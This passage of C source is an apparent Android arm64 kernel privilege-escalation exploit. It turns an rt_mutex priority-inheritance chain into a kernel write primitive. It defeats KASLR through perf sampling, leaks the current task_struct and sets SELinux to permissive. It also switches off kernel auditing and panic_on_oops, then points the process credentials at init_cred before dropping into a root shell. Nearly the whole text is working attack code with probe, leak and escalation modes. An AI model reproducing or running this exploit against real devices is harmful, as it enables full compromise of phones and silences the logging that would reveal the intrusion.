      pr_info("zero probe hit off=%#x val=%#llx\n", i, (unsigned long long)v);
      hits++;
    }
  }
  if (!hits) {
    pr_error("zero probe: no hit in zero page\n");
  }
  return hits ? 0 : 2;
}

/* Decisive diagnostic: point the dangling waiter's `lock` at
 * empty_zero_page (known, all-zero, writable linear alias).  If the PI chain
 * runs, step [7] rb_inserts the waiter into that "lock"'s waiter tree, which
 * stores the waiter's kernel stack address at zero_page+8/+0x10.  A fresh
 * read-only anonymous mapping maps empty_zero_page, so we can read it back:
 * nonzero => chain ran and we now know the waiter's stack address; zero =>
 * pi_blocked_on was NULL.  The owner is 0, so the chain returns at [9] after
 * wake_up_process(task); task = init_task is a no-op (TASK_RUNNING). */
static int run_leak_zero(void) {
  disable_rseq_for_thread();
  set_unbuffer();
  set_limit();
  if (!active_offsets && select_offsets() < 0) return 1;
  set_image_delta();
  init_p0_profile();
  init_ashmem_path();
  pin_to_core(CORE);
  kaslr_slide = 0;
  kaslr_base = KIMAGE_TEXT_BASE;
  if (active_offsets->kimage_text_base)
    kaslr_base = active_offsets->kimage_text_base;
  kaslr_done = 1;

  pselect_child_node = 1;
  set_pselect_write_mode(0, 0, 6);
  slab_drain();
  page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
  if (!page_base) { pr_error("leak-zero: page prep failed\n"); return 1; }

  // The fake lock is the zero page itself; the fake "task" is init_task so
  // the early-return wake_up_process() is a no-op.
  fake_lock = data_addr(EMPTY_ZERO_PAGE);
  fake_task = data_addr(INIT_TASK);
  pr_info("leak-zero fake_lock=%#zx fake_task=%#zx\n", fake_lock, fake_task);

  run_main_route_threads();
  clear_pselect_write();
  usleep(50000);

  unsigned char *zp = mmap(NULL, 4096, PROT_READ, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
  if (zp == MAP_FAILED) { pr_error("leak-zero mmap failed\n"); return 1; }
  // Read only -- do NOT touch the page (a write would COW and hide ZERO_PAGE).
  uint64_t w0 = *(volatile uint64_t *)(zp + 0x00);
  uint64_t w1 = *(volatile uint64_t *)(zp + 0x08);
  uint64_t w2 = *(volatile uint64_t *)(zp + 0x10);
  uint64_t w3 = *(volatile uint64_t *)(zp + 0x18);
  pr_info("zero page: +0=%#llx +8=%#llx +10=%#llx +18=%#llx\n",
          (unsigned long long)w0, (unsigned long long)w1,
          (unsigned long long)w2, (unsigned long long)w3);
  munmap(zp, 4096);
  return (w1 || w2) ? 0 : 2;
}

/* Safe oracle: write the known pointer (page_base+0x100) into the boot_id
 * buffer.  /proc/sys/kernel/random/boot_id is user-readable, so a changed
 * value proves the PI write primitive fired; leaving it alone is harmless. */
static int run_probe_bootid(void) {
  disable_rseq_for_thread();
  set_unbuffer();
  set_limit();
  if (!active_offsets && select_offsets() < 0) return 1;
  set_image_delta();
  init_p0_profile();
  init_ashmem_path();
  pin_to_core(CORE);
  kaslr_slide = 0;
  kaslr_base = KIMAGE_TEXT_BASE;
  if (active_offsets->kimage_text_base)
    kaslr_base = active_offsets->kimage_text_base;
  kaslr_done = 1;

  char before[64] = {0};
  int bfd = open("/proc/sys/kernel/random/boot_id", O_RDONLY);
  if (bfd >= 0) { read(bfd, before, sizeof(before) - 1); close(bfd); }
  pr_info("boot_id before: %s\n", before);

  slab_drain();
  uintptr_t target = data_addr(SLIDE_RANDOM_BOOT_ID_DATA_IMAGE);
  do_one_write(target, "BOOTID", 1);
  usleep(100000);

  char after[64] = {0};
  int afd = open("/proc/sys/kernel/random/boot_id", O_RDONLY);
  int n = afd >= 0 ? (int)read(afd, after, sizeof(after) - 1) : -1;
  if (afd >= 0) close(afd);

  char hex[160];
  int off = 0;
  for (int i = 0; i < n && off < (int)sizeof(hex) - 3; i++)
    off += snprintf(hex + off, sizeof(hex) - off, "%02x", (unsigned char)after[i]);
  pr_info("boot_id after n=%d hex=%s\n", n, hex);
  pr_info("expected write value=%#zx page_base=%#zx\n",
          (size_t)(page_base + 0x100), (size_t)page_base);
  return 0;
}

/* Stack-only write: no KernelSnitch, no heap page.  The fake rt_mutex and
 * fake waiter are built inside the sendmsg frame of the victim thread whose
 * kernel stack base was measured with perf. */
static void do_stack_write(uintptr_t target) {
  pselect_child_node = 1;
  set_pselect_write_mode(target, 0, 7);
  /* Non-NULL dummies so the route guard passes; the carrier ignores them. */
  page_base = 0x1000;
  fake_lock = 0x1000;
  fake_w0 = 0x1000;
  fake_task = 0x1000;
  fake_fops = 0x1000;
  run_main_route_threads();
  clear_pselect_write();
}

/* Oracle: stack-only write of a stack pointer into boot_id. */
static int run_stack_probe(void) {
  disable_rseq_for_thread();
  set_unbuffer();
  set_limit();
  if (!active_offsets && select_offsets() < 0) return 1;
  set_image_delta();
  init_p0_profile();
  init_ashmem_path();
  pin_to_core(CORE);
  kaslr_slide = 0;
  kaslr_base = KIMAGE_TEXT_BASE;
  if (active_offsets->kimage_text_base)
    kaslr_base = active_offsets->kimage_text_base;
  /* Canonical image addresses avoid any assumption about the physical
   * load address; the slide comes from fitting perf IPs to kallsyms. */
  const char *ksl = getenv("KASLR_SLIDE");
  if (ksl && *ksl) {
    kaslr_base += (uintptr_t)strtoull(ksl, NULL, 0);
    pr_info("kaslr_base = %#zx (slide %s)\n", (size_t)kaslr_base, ksl);
  }
  kaslr_done = 1;

  char before[64] = {0};
  int bfd = open("/proc/sys/kernel/random/boot_id", O_RDONLY);
  if (bfd >= 0) { read(bfd, before, sizeof(before) - 1); close(bfd); }
  pr_info("boot_id before: %s\n", before);

  /* STACK_TARGET_OFF lets the same oracle test any image offset. */
  if (env_flag("OWNER_SELF", 1)) use_self_owner();
  const char *toff = getenv("STACK_TARGET_OFF");
  if (toff && *toff) {
    uintptr_t off = (uintptr_t)strtoull(toff, NULL, 0);
    pr_info("stack probe offset %#zx -> %#zx\n", (size_t)off,
            (size_t)(kaslr_base + off));
    do_stack_write(kaslr_base + off);
  } else {
    do_stack_write(text_addr(SLIDE_RANDOM_BOOT_ID_DATA_IMAGE));
  }
  usleep(100000);

  char after[64] = {0};
  int afd = open("/proc/sys/kernel/random/boot_id", O_RDONLY);
  int n = afd >= 0 ? (int)read(afd, after, sizeof(after) - 1) : -1;
  if (afd >= 0) close(afd);
  char hex[160];
  int off = 0;
  for (int i = 0; i < n && off < (int)sizeof(hex) - 3; i++)
    off += snprintf(hex + off, sizeof(hex) - off, "%02x", (unsigned char)after[i]);
  pr_info("boot_id after n=%d hex=%s\n", n, hex);
  keepalive_block();
  return 0;
}

/* Perf-only diagnostic: dump kernel sample IPs so the per-boot KASLR slide can
 * be fitted locally against this device's own symbol table.  No kernel write. */
static int run_kstack_dump(void) {
  disable_rseq_for_thread();
  set_unbuffer();
  set_limit();
  pin_to_core(CORE);
  if (!sample_kstack_T()) return 2;
  return 0;
}

/* Stack-only write of 8 bytes at selinux_state+1.  Inverted shape: the value
 * written is a 256-byte-aligned stack address whose low byte is 0, so
 * `enforcing` becomes 0 and the remaining bytes only touch checkreqprot /
 * initialized / policycap[]. */
static int run_stack_selinux(void) {
  disable_rseq_for_thread();
  set_unbuffer();
  set_limit();
  if (!active_offsets && select_offsets() < 0) return 1;
  set_image_delta();
  init_p0_profile();
  init_ashmem_path();
  pin_to_core(CORE);
  kaslr_slide = 0;
  kaslr_base = KIMAGE_TEXT_BASE;
  if (active_offsets->kimage_text_base)
    kaslr_base = active_offsets->kimage_text_base;
  const char *ksl = getenv("KASLR_SLIDE");
  if (ksl && *ksl) {
    kaslr_base += (uintptr_t)strtoull(ksl, NULL, 0);
    pr_info("kaslr_base = %#zx (slide %s)\n", (size_t)kaslr_base, ksl);
  }
  kaslr_done = 1;

  char before[8] = {0};
  int bfd = open("/sys/fs/selinux/enforce", O_RDONLY);
  if (bfd >= 0) { read(bfd, before, sizeof(before) - 1); close(bfd); }
  pr_info("enforce before: %s\n", before);

  if (env_flag("OWNER_SELF", 1)) use_self_owner();
  do_stack_write(text_addr(SELINUX_ENFORCING_OFF));
  usleep(100000);

  char after[8] = {0};
  int afd = open("/sys/fs/selinux/enforce", O_RDONLY);
  int n = afd >= 0 ? (int)read(afd, after, sizeof(after) - 1) : -1;
  if (afd >= 0) close(afd);
  pr_info("enforce after n=%d: %s\n", n, after);
  keepalive_block();
  return 0;
}

/* Leak + kernel-validated geometry, with no PI trigger and no kernel write.
 * Safe to run repeatedly; used to prove the leak before any exploitation. */
static int run_leak_only(void) {
  disable_rseq_for_thread();
  set_unbuffer();
  set_limit();
  if (!active_offsets && select_offsets() < 0) return 1;
  set_image_delta();
  init_p0_profile();
  init_ashmem_path();
  pin_to_core(CORE);
  kaslr_slide = 0;
  kaslr_base = KIMAGE_TEXT_BASE;
  if (active_offsets->kimage_text_base)
    kaslr_base = active_offsets->kimage_text_base;
  kaslr_done = 1;

  pselect_child_node = 1;
  set_pselect_write_mode(0, 0, 6);
  slab_drain();
  uintptr_t base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
  pr_info("leak-only: mm=%#zx slab_base=%#zx result=%s\n",
          (size_t)last_mm_struct, (size_t)base, base ? "ok" : "FAIL");
  return base ? 0 : 1;
}

/* Make the carrier use this thread's own task_struct as the fake lock owner.
 * The chain then links its fake waiter into our pi_waiters, leaving the global
 * init_task tree untouched (a stale node there is what made later runs fault). */
static void use_self_owner(void) {
  uintptr_t t = leak_current_x22(kaslr_base + 0x198a0, kaslr_base + 0x19a00);
  if (!t) {
    pr_warning("self-owner: leak failed, keeping init_task as owner\n");
    return;
  }
  char buf[32];
  snprintf(buf, sizeof(buf), "%#zx", (size_t)t);
  setenv("STACK_OWNER_ADDR", buf, 1);
}

/* After a chain run the fake rt_waiter stays linked in init_task.pi_waiters.
 * It lives on the victim thread's kernel stack, so the process must stay alive
 * until every later run in this boot is done; otherwise the stack is freed,
 * the node turns into garbage and the next run's tree walk faults inside
 * rt_mutex_adjust_prio_chain.  KEEPALIVE=1 makes a run hold its stack. */
static void keepalive_block(void) {
  if (!env_flag("KEEPALIVE", 0)) return;
  pr_info("keepalive: pid %d holding kernel stack\n", (int)getpid());
  for (;;) sleep(3600);
}

/* Root: leak this thread's task_struct via perf (x22 = SP_EL0) and point both
 * task->cred and task->real_cred at &init_cred.  Both writes are required:
 * commit_creds() has BUG_ON(task->cred != task->real_cred), so changing only
 * one of them makes any later setresuid/setresgid BUG.  The erase's collateral
 * dirties init_cred+8 (gid/suid) only; uid/euid/caps stay intact, and after
 * setresuid() we hold a private copy anyway.  An optional trailing command is
 * exec'd as root. */
static int run_root_write(int argc, char **argv) {
  disable_rseq_for_thread();
  set_unbuffer();
  set_limit();
  if (!active_offsets && select_offsets() < 0) return 1;
  set_image_delta();
  init_p0_profile();
  init_ashmem_path();
  pin_to_core(CORE);
  kaslr_slide = 0;
  kaslr_base = KIMAGE_TEXT_BASE;
  if (active_offsets->kimage_text_base)
    kaslr_base = active_offsets->kimage_text_base;
  const char *ksl = getenv("KASLR_SLIDE");
  if (ksl && *ksl) {
    kaslr_base += (uintptr_t)strtoull(ksl, NULL, 0);
    pr_info("kaslr_base = %#zx (slide %s)\n", (size_t)kaslr_base, ksl);
  }
  kaslr_done = 1;

  uintptr_t task = leak_current_x22(kaslr_base + 0x198a0, kaslr_base + 0x19a00);
  if (!task) return 2;
  uintptr_t cred_slot = task + env_ulong("CRED_OFF", 0x7d8);
  uintptr_t real_slot = task + env_ulong("REAL_CRED_OFF", 0x7d0);
  uintptr_t init_cred = kaslr_base + INIT_CRED_OFF;
  pr_info("root: task=%#zx cred=%#zx real=%#zx init_cred=%#zx\n",
          (size_t)task, (size_t)cred_slot, (size_t)real_slot,
          (size_t)init_cred);

  char val[64];
  snprintf(val, sizeof(val), "%#zx", (size_t)init_cred);
  /* One pointer write only.  A second one is not needed: fork() runs
   * copy_creds() -> prepare_creds(), which copies current->cred and then sets
   * p->cred = p->real_cred = new, so the child has a consistent pair and can
   * exec without tripping commit_creds' BUG_ON(task->cred != old).  Keeping it
   * to one run also avoids the stale pi_waiters node that a second chain would
   * have to walk. */
  setenv("STACK_CHILD_TARGET", "1", 1);
  setenv("STACK_PARENT_ADDR", val, 1);
  if (env_flag("OWNER_SELF", 1)) {
    char obuf[32];
    snprintf(obuf, sizeof(obuf), "%#zx", (size_t)task);
    setenv("STACK_OWNER_ADDR", obuf, 1);
  }
  pr_info("root: writing cred\n");
  do_stack_write(cred_slot);
  unsetenv("STACK_CHILD_TARGET");
  unsetenv("STACK_PARENT_ADDR");
  usleep(50000);

  uid_t ru = -1, eu = -1, su = -1;
  getresuid(&ru, &eu, &su);
  pr_info("root: parent uid=%d euid=%d suid=%d\n", (int)ru, (int)eu, (int)su);
  if (ru != 0 && eu != 0) {
    pr_error("root: cred write did not take effect\n");
    return 3;
  }

  pid_t pid = fork();
  if (pid < 0) {
    pr_error("root: fork failed errno=%d\n", errno);
    return 5;
  }
  if (pid == 0) {
    int g = setresgid(0, 0, 0);
    int u = setresuid(0, 0, 0);
    gid_t rg = -1, eg = -1, sg = -1;
    getresgid(&rg, &eg, &sg);
    getresuid(&ru, &eu, &su);
    struct __user_cap_header_struct hdr = {_LINUX_CAPABILITY_VERSION_3, 0};
    struct __user_cap_data_struct caps[2] = {{0}};
    (void)syscall(SYS_capget, &hdr, caps);
    pr_info("root: child setresgid=%d setresuid=%d uid=%d euid=%d gid=%d "
            "egid=%d cap_eff=%#x/%#x\n", g, u, (int)ru, (int)eu, (int)rg,
            (int)eg, caps[0].effective, caps[1].effective);
    if (ru != 0 || eu != 0) _exit(6);
    if (argc > 2) {
      pr_info("root: exec: %s\n", argv[2]);
      execl("/system/bin/sh", "sh", "-c", argv[2], (char *)NULL);
      pr_error("root: exec failed errno=%d\n", errno);
      _exit(4);
    }
    _exit(0);
  }
  int status = 0;
  for (int i = 0; i < 60; i++) {
    if (waitpid(pid, &status, WNOHANG) == pid) break;
    usleep(50000);
  }
  pr_info("root: done (child %d status %d)\n", (int)pid, status);
  keepalive_block();
  return 0;
}

/* After security_hook_heads.capable is emptied, security_capable() returns 0
 * for every request, so an ordinary setuid(0) succeeds.  Optional argv[2] is a
 * shell command to run as root. */
static int run_become_root(int argc, char **argv) {
  disable_rseq_for_thread();
  set_unbuffer();
  uid_t ru = -1, eu = -1, su = -1;
  getresuid(&ru, &eu, &su);
  pr_info("become-root: before uid=%d euid=%d\n", (int)ru, (int)eu);
  setgroups(0, NULL);
  int g = setgid(0);
  int u = setuid(0);
  getresuid(&ru, &eu, &su);
  pr_info("become-root: setgid=%d setuid=%d -> uid=%d euid=%d\n",
          g, u, (int)ru, (int)eu);
  if (eu != 0) return 3;
  if (argc > 2) {
    execl("/system/bin/sh", "sh", "-c", argv[2], (char *)NULL);
    pr_error("become-root: exec failed errno=%d\n", errno);
    return 4;
  }
  return 0;
}

/* ---- single-binary PoC -------------------------------------------------- */

static int read_file_str(const char *path, char *buf, size_t n) {
  int fd = open(path, O_RDONLY);
  if (fd < 0) return -1;
  ssize_t r = read(fd, buf, n - 1);
  close(fd);
  if (r < 0) return -1;
  buf[r] = 0;
  return (int)r;
}

static int boot_completed(void) {
  char v[PROP_VALUE_MAX] = {0};
  if (__system_property_get("sys.boot_completed", v) > 0 && v[0] == '1')
    return 1;
  return 0;
}

/* Fit the per-boot virtual KASLR slide from perf sample IPs.  IRQs are enabled
 * right at el0_svc_common+0x48, so syscall-path samples pile onto the same IP;
 * its low 21 bits are invariant (the slide is 2 MB aligned). */
static uintptr_t fit_slide_self(void) {
  const uint64_t mode_low21 = 0x998e8ULL;
  const uint64_t mode_link = 0xffffff80080998e8ULL;
  struct { uintptr_t ip; size_t c; } hist[16];
  int hn = 0;
  for (int round = 0; round < 3; round++) {
    struct perf_event_attr pe;
    memset(&pe, 0, sizeof(pe));
    pe.type = PERF_TYPE_SOFTWARE;
    pe.size = sizeof(pe);
    pe.config = PERF_COUNT_SW_CPU_CLOCK;
    pe.sample_period = 200000;
    pe.sample_type = PERF_SAMPLE_IP;
    pe.disabled = 1;
    pe.exclude_user = 1;
    pe.exclude_hv = 1;
    pe.exclude_idle = 1;
    pe.wakeup_events = 1;
    int fd = (int)syscall(__NR_perf_event_open, &pe, 0, -1, -1, 0);
    if (fd < 0) { pr_error("fit: perf errno=%d\n", errno); return 0; }
    size_t msz = 4096 * 65;
    void *buf = mmap(NULL, msz, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    if (buf == MAP_FAILED) { close(fd); return 0; }
    ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
    for (int i = 0; i < 100000; i++) syscall(__NR_getpid);
    ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);
    struct perf_event_mmap_page *hdr = buf;
    uint64_t head = hdr->data_head;
    __sync_synchronize();
    char *base = (char *)buf + 4096;
    size_t dsz = 4096 * 64;
    uint64_t pos = hdr->data_tail;
    while (pos < head) {
      struct perf_event_header *ev = (void *)(base + (pos % dsz));
      if (ev->size == 0 || ev->size > dsz) break;
      if (ev->type == PERF_RECORD_SAMPLE) {
        uintptr_t ip = *(uint64_t *)((char *)ev + sizeof(*ev));
        if (ip >= 0xffffff8000000000ULL) {
          int k;
          for (k = 0; k < hn; k++) if (hist[k].ip == ip) break;
          if (k == hn && hn < 16) { hist[hn].ip = ip; hist[hn].c = 0; hn++; }
          if (k < hn) hist[k].c++;
        }
      }
      pos += ev->size;
    }
    hdr->data_tail = head;
    munmap(buf, msz);
    close(fd);
    /* Prefer an IP whose low 21 bits identify el0_svc_common+0x48. */
    for (int k = 0; k < hn; k++) {
      if ((hist[k].ip & 0x1fffff) == mode_low21 && hist[k].c >= 8) {
        uintptr_t slide = hist[k].ip - mode_link;
        if (slide % 0x200000 == 0) return slide;
      }
    }
    for (int k = 0; k < hn; k++) {
      if (hist[k].c >= 16) {
        uintptr_t slide = hist[k].ip - mode_link;
        if (slide % 0x200000 == 0) return slide;
      }
    }
    hn = 0;
  }
  return 0;
}

/* Zero `off` bytes at kaslr_base+off through the stack-only PI chain, keeping
 * the victim threads alive (KEEPALIVE) so their stacks stay valid. */
static int chain_zero(uintptr_t off) {
  setenv("STACK_ZERO_WRITE", "1", 1);
  char toff[32];
  snprintf(toff, sizeof(toff), "%#zx", (size_t)off);
  setenv("STACK_TARGET_OFF", toff, 1);
  do_stack_write(kaslr_base + off);
  unsetenv("STACK_ZERO_WRITE");
  unsetenv("STACK_TARGET_OFF");
  return 0;
}

/* Write `val` into `target` with the inverted shape. */
static int chain_write_ptr(uintptr_t target, uintptr_t val) {
  char vbuf[32];
  snprintf(vbuf, sizeof(vbuf), "%#zx", (size_t)val);
  setenv("STACK_CHILD_TARGET", "1", 1);
  setenv("STACK_PARENT_ADDR", vbuf, 1);
  do_stack_write(target);
  unsetenv("STACK_CHILD_TARGET");
  unsetenv("STACK_PARENT_ADDR");
  return 0;
}

/* Run one PI-chain write in a dedicated child process.  The child leaks its own
 * task_struct (so the fake waiter lands in *its* pi_waiters, never init_task's
 * or the shell's), performs the write, reports completion on a pipe and then
 * stays alive forever so the victim thread's kernel stack keeps the linked
 * fake waiter valid.  One chain per process is what made the manual sequence
 * stable (5 runs, zero oopses); two chains in one process crash. */
static int chain_in_child(int zero_mode, uintptr_t target) {
  int pfd[2];
  if (pipe(pfd) != 0) return -1;
  pid_t pid = fork();
  if (pid < 0) { close(pfd[0]); close(pfd[1]); return -1; }
  if (pid == 0) {
    close(pfd[0]);
    disable_rseq_for_thread();
    setenv("KEEPALIVE", "1", 1);
    uintptr_t self = leak_current_x22(kaslr_base + 0x198a0,
                                      kaslr_base + 0x19a00);
    if (self) {
      char b[32];
      snprintf(b, sizeof(b), "%#zx", (size_t)self);
      setenv("STACK_OWNER_ADDR", b, 1);
    }
    if (zero_mode) {
      char t[32];
      snprintf(t, sizeof(t), "%#zx", (size_t)target);
      setenv("STACK_ZERO_WRITE", "1", 1);
      setenv("STACK_TARGET_OFF", t, 1);
    } else {
      char v[32];
      snprintf(v, sizeof(v), "%#zx", (size_t)(kaslr_base + INIT_CRED_OFF));
      setenv("STACK_CHILD_TARGET", "1", 1);
      setenv("STACK_PARENT_ADDR", v, 1);
    }
    do_stack_write(target);
    char ok = 1;
    (void)!write(pfd[1], &ok, 1);
    close(pfd[1]);
    /* Stay alive: the fake waiter is linked in this task's pi_waiters and its
     * storage is the victim thread's kernel stack, so the task must outlive
     * every later run.  This mirrors the verified manual sequence (one chain
     * per process, process kept alive). */
    for (;;) pause();
  }
  close(pfd[1]);
  char ok = 0;
  ssize_t n = read(pfd[0], &ok, 1);
  close(pfd[0]);
  if (n != 1 || ok != 1) { pr_error("chain child failed\n"); return -1; }
  return 0;
}

/* Minimal root REPL.  Exec'ing an *interactive* mksh (sh -i) reliably wedges
 * this kernel right after startup (black screen, watchdog reset) even with
 * panic_on_oops=0, while `sh -c '<cmd>'` through the same fork path is stable
 * across many runs.  So read lines ourselves and run each one via `sh -c`. */
static void root_repl(void) {
  char line[1024];
  for (;;) {
    if (isatty(0)) (void)!write(1, "# ", 2);
    size_t n = 0;
    char c = 0;
    ssize_t r;
    while ((r = read(0, &c, 1)) == 1 && c != '\n') {
      if (n + 1 < sizeof(line)) line[n++] = c;
    }
    line[n] = 0;
    if (r != 1 && n == 0) break;
    while (n > 0 && (line[n - 1] == '\r' || line[n - 1] == ' ')) line[--n] = 0;
    if (n == 0) continue;
    if (!strcmp(line, "exit") || !strcmp(line, "quit")) break;
    if (!strncmp(line, "cd", 2) && (line[2] == 0 || line[2] == ' ')) {
      const char *d = line + 2;
      while (*d == ' ') d++;
      if (!*d) d = "/";
      if (chdir(d) != 0) { perror("cd"); continue; }
      continue;
    }
    pid_t p = fork();
    if (p == 0) {
      execl("/system/bin/sh", "sh", "-c", line, (char *)NULL);
      _exit(127);
    }
    if (p > 0) {
      int st = 0;
      waitpid(p, &st, 0);
    } else {
      perror("fork");
    }
  }
}

/* Print just the per-boot KASLR slide (plain output, for the on-device sh
 * wrapper to capture). */
static int run_fit(void) {
  disable_rseq_for_thread();
  set_unbuffer();
  set_limit();
  pin_to_core(CORE);
  uintptr_t slide = 0;
  for (int i = 0; i < 3 && !slide; i++) slide = fit_slide_self();
  if (!slide) return 1;
  printf("%#zx\n", (size_t)slide);
  return 0;
}

static int run_shell(void) {
  disable_rseq_for_thread();
  set_unbuffer();
  set_limit();
  if (!active_offsets && select_offsets() < 0) return 1;
  set_image_delta();
  init_p0_profile();
  init_ashmem_path();
  pin_to_core(CORE);
  kaslr_done = 0;

  pr_info("== r5g root PoC ==\n");
  if (!boot_completed()) {
    pr_warning("framework not booted yet (sys.boot_completed != 1); waiting up "
               "to 120s before touching the kernel\n");
    for (int i = 0; i < 120 && !boot_completed(); i++) sleep(1);
    if (!boot_completed()) {
      pr_error("still not booted; rerun once the system is up\n");
      return 2;
    }
  }

  uintptr_t slide = 0;
  for (int i = 0; i < 3 && !slide; i++) slide = fit_slide_self();
  if (!slide) {
    pr_error("could not fit the KASLR slide\n");
    return 3;
  }
  kaslr_base = KIMAGE_TEXT_BASE + slide;
  kaslr_done = 1;
  pr_info("slide=%#zx kaslr_base=%#zx\n", (size_t)slide, (size_t)kaslr_base);

  /* Keep the victim-thread stacks alive for the whole session: the fake
   * waiters stay linked in *our own* pi_waiters, so they must stay valid. */
  setenv("KEEPALIVE", "1", 1);

  uintptr_t me = leak_current_x22(kaslr_base + 0x198a0, kaslr_base + 0x19a00);
  if (!me) { pr_error("cannot leak current task\n"); return 4; }
  pr_info("shell task=%#zx\n", (size_t)me);

  pr_info("[1/4] SELinux -> permissive\n");
  if (chain_in_child(1, kaslr_base + 0x31b6000) != 0) return 5;
  usleep(200000);
  char enf[8] = {0};
  read_file_str("/sys/fs/selinux/enforce", enf, sizeof(enf));
  if (enf[0] != '0') {
    pr_warning("enforce=%s, retrying\n", enf);
    if (chain_in_child(1, kaslr_base + 0x31b6000) != 0) return 5;
    usleep(200000);
    enf[0] = 0;
    read_file_str("/sys/fs/selinux/enforce", enf, sizeof(enf));
    if (enf[0] != '0') { pr_error("SELinux still enforcing\n"); return 5; }
  }
  pr_info("      enforce=%s", enf);

  pr_info("[2/5] audit_enabled -> 0 (stop the permissive avc log storm)\n");
  if (chain_in_child(1, kaslr_base + 0x2a3ebf8) != 0) return 5;
  sleep(2);

  pr_info("[3/5] panic_on_oops -> 0\n");
  if (chain_in_child(1, kaslr_base + 0x2a12c90) != 0) return 5;
  sleep(2);

  pr_info("[4/5] task->cred = &init_cred\n");
  if (chain_in_child(0, me + 0x7d8) != 0) return 5;
  sleep(2);

  pr_info("[5/5] task->real_cred = &init_cred\n");
  if (chain_in_child(0, me + 0x7d0) != 0) return 5;
  sleep(1);

  int g = setresgid(0, 0, 0);
  int u = setresuid(0, 0, 0);
  uid_t ru = -1, eu = -1, su = -1;
  getresuid(&ru, &eu, &su);
  pr_info("setresgid=%d setresuid=%d -> uid=%d euid=%d\n", g, u, (int)ru,
          (int)eu);
  if (ru != 0 || eu != 0) {
    pr_error("escalation failed; reboot and rerun\n");
    return 6;
  }
  pr_info("SELinux=permissive uid=0, entering root shell (one command per line)\n");
  root_repl();
  return 0;
}

int main(int argc, char **argv) {
    handle_umh_mode(argc, argv);
    if (argc == 1 || (argc > 1 && strcmp(argv[1], "--shell") == 0))
        return run_shell();
    if (argc > 1 && strcmp(argv[1], "--fit") == 0)
        return run_fit();
    if (argc > 1 && strcmp(argv[1], "--bootstrap") == 0)
        return run_bootstrap();
    if (argc > 1 && strcmp(argv[1], "--write1") == 0)
        return run_write1_only();
    if (argc > 1 && strcmp(argv[1], "--zero-probe") == 0)
        return run_zero_probe();
    if (argc > 1 && strcmp(argv[1], "--spray-only") == 0)
        return run_spray_only();
    if (argc > 1 && strcmp(argv[1], "--probe-bootid") == 0)
        return run_probe_bootid();
    if (argc > 1 && strcmp(argv[1], "--leak-zero") == 0)
        return run_leak_zero();
    if (argc > 1 && strcmp(argv[1], "--leak-only") == 0)
        return run_leak_only();
    if (argc > 1 && strcmp(argv[1], "--stack-probe") == 0)
        return run_stack_probe();
    if (argc > 1 && strcmp(argv[1], "--selinux-write") == 0)
        return run_stack_selinux();
    if (argc > 1 && strcmp(argv[1], "--kstack-dump") == 0)
        return run_kstack_dump();
    if (argc > 1 && strcmp(argv[1], "--root-write") == 0)
        return run_root_write(argc, argv);
    if (argc > 1 && strcmp(argv[1], "--become-root") == 0)
        return run_become_root(argc, argv);
    return run_exploit(argc, argv);
}